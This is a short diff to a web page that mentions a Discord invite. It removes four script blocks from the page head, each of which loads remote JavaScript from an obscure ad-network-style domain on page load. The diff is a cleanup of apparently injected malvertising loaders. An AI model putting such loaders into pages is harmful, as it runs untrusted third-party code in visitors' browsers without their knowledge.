@@ -35,14 +35,4 @@ https://discord.gg/32DuhaYFH
 
 [back](./)
 <head>
-<script>
-(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('oaphoace.net',5333655,document.createElement('script'))
-</script>
-<script>
-(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('foomaque.net',5333677,document.createElement('script'))
-</script>
-<script async="async" data-cfasync="false" src="//upgulpinon.com/1?z=5333690"></script>
-<script>
-(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'https://inklinkor.com/tag.min.js',5333693,document.body||document.documentElement)
-</script>
 </head>
